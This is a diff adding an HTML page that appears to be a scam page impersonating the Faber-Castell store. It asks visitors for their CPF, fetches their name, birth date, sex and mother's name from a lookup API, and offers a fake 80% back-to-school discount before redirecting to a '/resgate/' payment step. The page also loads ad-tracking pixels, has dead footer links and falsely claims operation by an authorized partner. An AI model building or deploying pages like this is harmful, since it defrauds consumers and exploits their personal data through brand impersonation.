@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loja Faber-Castell - Login</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --brand-red:#D40E28;
+      --brand-blue:#4a73b2;
+
+      --text:#222;
+      --muted:#6b7280;
+      --border:#d2d2d2;
+      --bg:#ffffff;
+      --err:#d12b2b;
+
+      /* ✅ Proporções ajustadas para ficar no mesmo "tamanho visual" da referência */
+      --topbar-h: 88px;
+
+      --wrap-max: 420px;
+      --wrap-pad-top: 28px;
+      --wrap-pad-side: 16px;
+      --wrap-pad-bottom: 36px;
+
+      --card-pad-y: 24px;
+      --card-pad-x: 20px;
+
+      --radius: 6px;
+
+      --h1: 22px;
+      --h2: 18px;
+
+      --label: 14px;
+      --fine: 13px;
+
+      --input-font: 15px;
+      --btn-font: 16px;
+      --outline-font: 15px;
+
+      --input-h: 48px;
+      --btn-h: 48px;
+      --outline-h: 46px;
+    }
+
+    *{ margin:0; padding:0; box-sizing:border-box; }
+
+    body{
+      font-family:"Sora", system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background:#fff;
+      color:var(--text);
+    }
+
+    /* HEADER */
+    .topbar{
+      background:var(--brand-red);
+      height:var(--topbar-h);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding: 0 12px;
+    }
+
+    .brand-logo{
+      height: 60px;
+      width:auto;
+      display:block;
+      user-select:none;
+    }
+
+    /* CONTAINER */
+    .wrap{
+      max-width: var(--wrap-max);
+      margin: 0 auto;
+      padding: var(--wrap-pad-top) var(--wrap-pad-side) var(--wrap-pad-bottom);
+    }
+
+    /* CARD LOGIN */
+    .card{
+      background:var(--bg);
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      padding: var(--card-pad-y) var(--card-pad-x) calc(var(--card-pad-y) - 2px);
+    }
+
+    .card h1{
+      font-size:var(--h1);
+      font-weight:700;
+      margin-bottom:12px;
+      text-align:left;
+      letter-spacing:-0.2px;
+    }
+
+    .divider{
+      height:1px;
+      background:var(--border);
+      margin: 0 0 18px;
+    }
+
+    .form-error{
+      display:none;
+      text-align:left;
+      margin: 0 0 12px;
+      color:var(--err);
+      font-weight:700;
+      font-size: 13px;
+      line-height:1.25;
+    }
+
+    label{
+      display:block;
+      text-align:left;
+      font-weight:600;
+      font-size:var(--label);
+      margin-bottom:8px;
+    }
+
+    .input{
+      width:100%;
+      height:var(--input-h);
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      font-size:var(--input-font);
+      padding: 0 12px;
+      outline:none;
+      transition:border-color .15s ease;
+    }
+    .input:focus{ border-color:#b9c7e6; }
+
+    .btn-primary{
+      width:100%;
+      height:var(--btn-h);
+      margin-top:16px;
+      border:none;
+      border-radius: var(--radius);
+      background:#D40E28;
+      color:#fff;
+      font-weight:700;
+      font-size:var(--btn-font);
+      cursor:pointer;
+      transition:transform .08s ease, filter .15s ease;
+    }
+    .btn-primary:active{ transform:scale(.99); }
+    .btn-primary:hover{ filter:brightness(.98); }
+
+    .fineprint{
+      text-align:center;
+      margin-top:16px;
+      font-size:var(--fine);
+      line-height:1.4;
+      color:#444;
+    }
+    .fineprint a{
+      color:var(--text);
+      text-decoration:underline;
+      font-weight:600;
+    }
+
+    /* BLOCO CRIAR CONTA */
+    .below{
+      margin:24px auto 0;
+      text-align:center;
+      padding: 0 2px;
+    }
+    .below h2{
+      font-size:var(--h2);
+      font-weight:600;
+      margin-bottom:12px;
+    }
+    .btn-outline{
+      width:100%;
+      height:var(--outline-h);
+      border-radius: var(--radius);
+      border:1px solid var(--brand-blue);
+      background:#fff;
+      color:var(--brand-blue);
+      font-size:var(--outline-font);
+      font-weight:700;
+      cursor:pointer;
+    }
+
+    /* TELA 2: RESUMO */
+    .summary{
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      padding: 22px 18px;
+      background:#fff;
+    }
+    .summary h1{
+      font-size: 20px;
+      font-weight:700;
+      margin-bottom:12px;
+      text-align:left;
+    }
+
+    /* ✅ AVISO (com presente animado) */
+    .badge{
+      display:flex;
+      align-items:flex-start;
+      gap:10px;
+      margin-top:10px;
+      background:#fff3cd;
+      border:1px solid #ffe08a;
+      color:#7a5a00;
+      padding: 10px 12px;
+      border-radius:10px;
+      font-weight:700;
+      font-size: 13px;
+      line-height:1.35;
+    }
+
+    .gift{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      width: 28px;
+      height: 28px;
+      font-size: 18px;
+      transform-origin: 50% 60%;
+      animation: giftFloat 2.6s ease-in-out infinite;
+      filter: drop-shadow(0 2px 6px rgba(0,0,0,.12));
+      margin-top:1px;
+      flex: 0 0 auto;
+    }
+
+    @keyframes giftFloat{
+      0%   { transform: translateY(0) rotate(0deg) scale(1); }
+      50%  { transform: translateY(-3px) rotate(-2deg) scale(1.02); }
+      100% { transform: translateY(0) rotate(0deg) scale(1); }
+    }
+
+    @media (prefers-reduced-motion: reduce){
+      .gift{ animation: none; }
+    }
+
+    .grid{
+      margin-top: 14px;
+      display:grid;
+      grid-template-columns: 1fr;
+      gap: 10px;
+    }
+    .row{
+      border:1px solid var(--border);
+      border-radius:10px;
+      padding: 12px 12px;
+      text-align:left;
+    }
+    .row .k{
+      font-size: 11px;
+      color:var(--muted);
+      font-weight:700;
+      text-transform:uppercase;
+      letter-spacing:.6px;
+    }
+    .row .v{
+      margin-top:6px;
+      font-size: 15px;
+      font-weight:700;
+      color:var(--text);
+      word-break:break-word;
+    }
+
+    .cta{
+      margin-top: 14px;
+      font-size: 14px;
+      line-height:1.5;
+      text-align:left;
+      color:#111;
+    }
+
+    .btn-row{
+      margin-top: 14px;
+      display:flex;
+      gap:10px;
+    }
+    .btn-small{
+      flex:1;
+      height: 44px;
+      border-radius:10px;
+      border:none;
+      cursor:pointer;
+      font-weight:800;
+      font-size: 14px;
+    }
+    .btn-small.primary{ background:#d40e28; color:#fff; }
+    .btn-small.ghost{ background:#f3f4f6; color:#111; border:1px solid var(--border); }
+
+    /* LOADING */
+    .loading{
+      display:none;
+      margin-top: 10px;
+      font-size: 12px;
+      color:var(--muted);
+      font-weight:600;
+      text-align:left;
+    }
+
+    /* ✅ FOOTER */
+    footer{
+      border-top:1px solid var(--border);
+      background:#fff;
+    }
+    .footer-wrap{
+      max-width: var(--wrap-max);
+      margin: 0 auto;
+      padding: 26px 16px 40px;
+      color:#5b5b5b;
+      font-size: 13px;
+      line-height:1.45;
+      text-align:center;
+    }
+    .footer-block{ margin-bottom: 22px; }
+    .footer-title{
+      font-weight:800;
+      color:#D40E28;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .footer-links{
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+    }
+    .footer-links a{
+      color:#5b5b5b;
+      text-decoration:none;
+      font-weight:500;
+    }
+    .footer-links a:hover{ text-decoration:underline; }
+
+    /* ✅ Redes sociais com SVGs */
+    .social{
+      display:flex;
+      justify-content:center;
+      gap:14px;
+      margin-top:10px;
+    }
+    .social a{
+      width:38px;
+      height:38px;
+      border-radius:7px;
+      background:#e5e7eb;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      text-decoration:none;
+      transition: transform .12s ease, filter .12s ease;
+    }
+    .social a:hover{ transform: translateY(-1px); filter: brightness(.98); }
+    .social a:active{ transform: translateY(0); }
+
+    .institucional__icon{
+      width:20px;
+      height:20px;
+      display:block;
+    }
+  </style>
+</head>
+
+<body>
+
+  <script>
+  window.pixelId = "6957ef5a2f51ce818e3d3e63";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+ 
+  <!-- HEADER -->
+  <header class="topbar">
+    <img class="brand-logo" src="/images/logobranca.webp" alt="Logo">
+  </header>
+
+  <main class="wrap">
+    <!-- TELA 1: LOGIN -->
+    <section id="screen-login">
+      <div class="card">
+        <h1>Faça seu cadastro</h1>
+        <div class="divider"></div>
+
+        <div class="form-error" id="formError">CPF inválido. Verifique e tente novamente.</div>
+
+        <form id="loginForm">
+          <label for="cpfEmail">Digite seu CPF:</label>
+          <input
+            id="cpfEmail"
+            class="input"
+            type="text"
+            inputmode="numeric"
+            autocomplete="off"
+            maxlength="14"
+          />
+
+          <button class="btn-primary" type="submit">Continuar</button>
+          <div class="loading" id="loading">Consultando dados…</div>
+
+          <div class="fineprint">
+            Ao continuar, você concorda com a<br>
+            <a href="#" onclick="return false;">Política de Privacidade</a> da Loja.
+          </div>
+        </form>
+      </div>
+    </section>
+
+    <!-- TELA 2: RESUMO -->
+    <section id="screen-summary" style="display:none;">
+      <div class="summary">
+        <h1>Resumo do cadastro</h1>
+
+        <div class="badge">
+          <span class="gift" aria-hidden="true">🎁</span>
+       <span>
+  Como cliente fiel, você foi selecionado para receber
+  <span style="color:#D40E28;">80% de desconto exclusivo</span>
+  na Promoção de Volta às Aulas.
+</span>
+        </div>
+
+        <div class="grid" id="summaryGrid"></div>
+
+        <p class="cta">
+          Para resgatar seu desconto, clique em <b>Continuar</b>.
+        </p>
+
+        <div class="btn-row">
+          <button class="btn-small ghost" type="button" id="btnBack">Voltar</button>
+          <button class="btn-small primary" type="button" id="btnContinue">Continuar</button>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- ✅ Footer com SVGs personalizados -->
+  <footer>
+    <div class="footer-wrap">
+
+      <div class="footer-block">
+        <div class="footer-title">Institucional</div>
+        <div class="footer-links">
+          <a href="#" onclick="return false;">Sobre a loja</a>
+          <a href="#" onclick="return false;">Assessoria</a>
+          <a href="#" onclick="return false;">Atendimento</a>
+          <a href="#" onclick="return false;">Sustentabilidade</a>
+          <a href="#" onclick="return false;">Cursos online</a>
+          <a href="#" onclick="return false;">Lojista</a>
+        </div>
+      </div>
+
+      <div class="footer-block">
+        <div class="footer-title">Redes Sociais</div>
+
+        <div class="social">
+          <!-- Instagram -->
+          <a href="#" onclick="return false;" aria-label="Instagram">
+            <svg class="institucional__icon" id="Camada_1" alt="Instagram" data-name="Camada 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448.25 448.15">
+              <defs><style>.svg-instagram{fill:#606060;}</style></defs>
+              <path class="svg-instagram" d="M224.1,141A114.9,114.9,0,1,0,339,255.9,114.72,114.72,0,0,0,224.1,141Zm0,189.6a74.7,74.7,0,1,1,74.7-74.7,74.84,74.84,0,0,1-74.7,74.7ZM370.5,136.3a26.8,26.8,0,1,1-26.8-26.8A26.74,26.74,0,0,1,370.5,136.3Zm76.1,27.2c-1.7-35.9-9.9-67.7-36.2-93.9s-58-34.4-93.9-36.2c-37-2.1-147.9-2.1-184.9,0C95.8,35.1,64,43.3,37.7,69.5s-34.4,58-36.2,93.9c-2.1,37-2.1,147.9,0,184.9,1.7,35.9,9.9,67.7,36.2,93.9s58,34.4,93.9,36.2c37,2.1,147.9,2.1,184.9,0,35.9-1.7,67.7-9.9,93.9-36.2s34.4-58,36.2-93.9c2.1-37,2.1-147.8,0-184.8ZM398.8,388a75.63,75.63,0,0,1-42.6,42.6c-29.5,11.7-99.5,9-132.1,9s-102.7,2.6-132.1-9A75.63,75.63,0,0,1,49.4,388c-11.7-29.5-9-99.5-9-132.1s-2.6-102.7,9-132.1A75.63,75.63,0,0,1,92,81.2c29.5-11.7,99.5-9,132.1-9s102.7-2.6,132.1,9a75.63,75.63,0,0,1,42.6,42.6c11.7,29.5,9,99.5,9,132.1S410.5,358.6,398.8,388Z" transform="translate(0.07 -31.82)"></path>
+            </svg>
+          </a>
+
+          <!-- Facebook -->
+          <a href="#" onclick="return false;" aria-label="Facebook">
+            <svg class="institucional__icon" alt="Facebook" id="Camada_1" data-name="Camada 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 493">
+              <defs><style>.svg-facebook{fill:#606060;}</style></defs>
+              <path class="svg-facebook" d="M504,256C504,119,393,8,256,8S8,119,8,256C8,379.78,98.69,482.38,217.25,501V327.69h-63V256h63V201.36c0-62.15,37-96.48,93.67-96.48,27.14,0,55.52,4.84,55.52,4.84v61H335.16c-30.8,0-40.41,19.12-40.41,38.73V256h68.78l-11,71.69H294.75V501C413.31,482.38,504,379.78,504,256Z" transform="translate(-8 -8)"></path>
+            </svg>
+          </a>
+
+          <!-- Twitter -->
+          <a href="#" onclick="return false;" aria-label="Twitter">
+            <svg class="institucional__icon" id="Camada_1" alt="Twitter" data-name="Camada 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 448">
+              <defs><style>.cls-1{fill:#606060;}</style></defs>
+              <path class="cls-1" d="M400,32H48A48,48,0,0,0,0,80V432a48,48,0,0,0,48,48H400a48,48,0,0,0,48-48V80A48,48,0,0,0,400,32ZM351.1,190.8c.2,2.8.2,5.7.2,8.5,0,86.7-66,186.6-186.6,186.6A185.74,185.74,0,0,1,64,356.5a138.17,138.17,0,0,0,15.8.8,131.49,131.49,0,0,0,81.4-28,65.67,65.67,0,0,1-61.3-45.5c10.1,1.5,19.2,1.5,29.6-1.2A65.59,65.59,0,0,1,77,218.2v-.8a65.54,65.54,0,0,0,29.6,8.3,65.44,65.44,0,0,1-29.2-54.6A64.77,64.77,0,0,1,86.3,138a186.22,186.22,0,0,0,135.2,68.6c-9.3-44.5,24-80.6,64-80.6a65.35,65.35,0,0,1,47.9,20.7A128.52,128.52,0,0,0,375,130.9,65.41,65.41,0,0,1,346.2,167,130.52,130.52,0,0,0,384,156.8,138,138,0,0,1,351.1,190.8Z" transform="translate(0 -32)"></path>
+            </svg>
+          </a>
+
+          <!-- YouTube -->
+          <a href="#" onclick="return false;" aria-label="YouTube">
+            <svg class="institucional__icon" id="Camada_1" alt="Youtube" data-name="Camada 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 546.13 384">
+              <defs><style>.svg-youtube{fill:#606060;}</style></defs>
+              <path class="svg-youtube" d="M549.66,124.08a68.63,68.63,0,0,0-48.29-48.59C458.78,64,288,64,288,64S117.22,64,74.63,75.49a68.63,68.63,0,0,0-48.29,48.59C14.93,167,14.93,256.39,14.93,256.39s0,89.44,11.41,132.3c6.29,23.65,24.79,41.5,48.29,47.82C117.22,448,288,448,288,448s170.78,0,213.37-11.49c23.5-6.32,42-24.17,48.29-47.82,11.41-42.86,11.41-132.3,11.41-132.3S561.07,167,549.66,124.08ZM232.15,337.59V175.18l142.73,81.21-142.73,81.2Z" transform="translate(-14.93 -64)"></path>
+            </svg>
+          </a>
+        </div>
+      </div>
+
+      <div class="footer-block">
+        <div class="footer-title">Certificados e Segurança</div>
+        <div class="footer-links">
+          <a href="#" onclick="return false;">Certificação digital</a>
+        </div>
+      </div>
+
+      <div class="footer-note">
+        Você está em um site operado por parceiro autorizado. As informações fornecidas seguem a Política de Privacidade.
+      </div>
+
+    </div>
+  </footer>
+
+  <script>
+    const $ = (sel) => document.querySelector(sel);
+
+    const loginForm = $("#loginForm");
+    const input = $("#cpfEmail");
+    const loading = $("#loading");
+    const formError = $("#formError");
+
+    const screenLogin = $("#screen-login");
+    const screenSummary = $("#screen-summary");
+    const summaryGrid = $("#summaryGrid");
+
+    const btnBack = $("#btnBack");
+    const btnContinue = $("#btnContinue");
+
+    const STORAGE_KEY_SIMPLE = "dadosUsuario";
+    const STORAGE_KEY_FULL = "leadResumo";
+
+    function onlyDigits(s){ return (s || "").replace(/\D/g, ""); }
+
+    function maskCpf(v){
+      const d = onlyDigits(v).slice(0, 11);
+      let out = d;
+      if (d.length > 3) out = d.slice(0,3) + "." + d.slice(3);
+      if (d.length > 6) out = d.slice(0,3) + "." + d.slice(3,6) + "." + d.slice(6);
+      if (d.length > 9) out = d.slice(0,3) + "." + d.slice(3,6) + "." + d.slice(6,9) + "-" + d.slice(9);
+      return out;
+    }
+
+    function isValidCpfDigits(cpf){
+      if (!cpf || cpf.length !== 11) return false;
+      if (/^(\d)\1{10}$/.test(cpf)) return false;
+      return true;
+    }
+
+    input.addEventListener("input", () => {
+      formError.style.display = "none";
+      const v = input.value;
+      if (v.includes("@")) return;
+      input.value = maskCpf(v);
+    });
+
+    function escapeHtml(str){
+      return String(str ?? "").replace(/[&<>"']/g, (m) => ({
+        "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#039;"
+      }[m]));
+    }
+
+    function renderSummary(dados){
+      const rows = [
+        { k: "CPF", v: dados.cpfFormatado || (dados.cpf ? maskCpf(dados.cpf) : "-") },
+        { k: "Nome", v: dados.nome || "-" },
+        { k: "Nascimento", v: dados.nascimento || "-" },
+        { k: "Sexo", v: dados.sexo || "-" },
+        { k: "Nome da mãe", v: dados.nome_mae || "-" },
+      ];
+
+      summaryGrid.innerHTML = rows.map(r => `
+        <div class="row">
+          <div class="k">${r.k}</div>
+          <div class="v">${escapeHtml(r.v)}</div>
+        </div>
+      `).join("");
+    }
+
+    function salvarNoLocalStorage(dados){
+      const payload = {
+        nome: (dados.nome || "").trim(),
+        cpf: onlyDigits(dados.cpf || ""),
+        cpfFormatado: dados.cpfFormatado || (dados.cpf ? maskCpf(dados.cpf) : ""),
+        nascimento: dados.nascimento || "",
+        sexo: dados.sexo || "",
+        nome_mae: dados.nome_mae || "",
+        desconto: 80,
+        campanha: "Volta às Aulas",
+        updatedAt: new Date().toISOString()
+      };
+
+      localStorage.setItem(STORAGE_KEY_SIMPLE, JSON.stringify({
+        nome: payload.nome,
+        cpf: payload.cpf
+      }));
+
+      localStorage.setItem(STORAGE_KEY_FULL, JSON.stringify(payload));
+
+      localStorage.setItem("cpf", payload.cpf);
+      localStorage.setItem("nome", payload.nome);
+      localStorage.setItem("nascimento", payload.nascimento);
+      localStorage.setItem("sexo", payload.sexo);
+      localStorage.setItem("nome_mae", payload.nome_mae);
+    }
+
+    async function consultarCpfNoSeuBackend(cpfDigits){
+      const url = `/api/consulta-cpf?cpf=${encodeURIComponent(cpfDigits)}`;
+      const r = await fetch(url, { method:"GET", headers:{ "Accept":"application/json" } });
+      const j = await r.json().catch(() => ({}));
+
+      if (!r.ok || j?.valid === false){
+        const msg = j?.message || "CPF inválido. Verifique e tente novamente.";
+        const err = new Error(msg);
+        err.code = "CPF_INVALID";
+        throw err;
+      }
+
+      const raw = j?.data?.data || j?.data || j;
+
+      return {
+        cpf: raw?.cpf || cpfDigits,
+        nome: raw?.nome || raw?.NOME || raw?.nome_completo || "",
+        nascimento: raw?.nascimento || raw?.NASC || raw?.data_nascimento || "",
+        sexo: raw?.sexo || raw?.SEXO || "",
+        nome_mae: raw?.nome_mae || raw?.NOME_MAE || ""
+      };
+    }
+
+    loginForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      formError.style.display = "none";
+
+      const raw = input.value.trim();
+      const isEmail = raw.includes("@");
+      const cpfDigits = onlyDigits(raw);
+
+      if (isEmail){
+        const dados = { cpf:"", cpfFormatado:"", nome: raw, nascimento:"", sexo:"", nome_mae:"" };
+        salvarNoLocalStorage(dados);
+        renderSummary(dados);
+        screenLogin.style.display = "none";
+        screenSummary.style.display = "block";
+        return;
+      }
+
+      if (!isValidCpfDigits(cpfDigits)){
+        formError.textContent = "Digite um CPF válido (11 dígitos).";
+        formError.style.display = "block";
+        return;
+      }
+
+      loading.style.display = "block";
+
+      try{
+        const dados = await consultarCpfNoSeuBackend(cpfDigits);
+
+        if (!dados?.nome){
+          throw new Error("CPF inválido. Verifique e tente novamente.");
+        }
+
+        const dadosOk = {
+          cpf: cpfDigits,
+          cpfFormatado: maskCpf(cpfDigits),
+          nome: dados?.nome || "",
+          nascimento: dados?.nascimento || "",
+          sexo: dados?.sexo || "",
+          nome_mae: dados?.nome_mae || ""
+        };
+
+        salvarNoLocalStorage(dadosOk);
+        renderSummary(dadosOk);
+
+        screenLogin.style.display = "none";
+        screenSummary.style.display = "block";
+      } catch(err){
+        formError.textContent = err?.message || "Não foi possível carregar os dados agora. Tente novamente.";
+        formError.style.display = "block";
+      } finally {
+        loading.style.display = "none";
+      }
+    });
+
+    btnBack && btnBack.addEventListener("click", () => {
+      screenSummary.style.display = "none";
+      screenLogin.style.display = "block";
+    });
+
+    btnContinue && btnContinue.addEventListener("click", () => {
+      window.location.href = "/resgate/";
+    });
+
+    (function(){
+      const trilha = document.getElementById("trilha");
+      if (!trilha) return;
+
+      trilha.volume = 0.05;
+      let started = false;
+
+      async function playAudio(){
+        if (started) return;
+        try{ await trilha.play(); started = true; } catch(e){}
+      }
+
+      document.addEventListener("DOMContentLoaded", playAudio);
+
+      const unlockEvents = ["click","touchstart","keydown","scroll","mousemove"];
+      const unlock = () => {
+        playAudio();
+        unlockEvents.forEach(ev => window.removeEventListener(ev, unlock, { passive:true }));
+      };
+      unlockEvents.forEach(ev => window.addEventListener(ev, unlock, { passive:true }));
+    })();
+  </script>
+</body>
+</html>
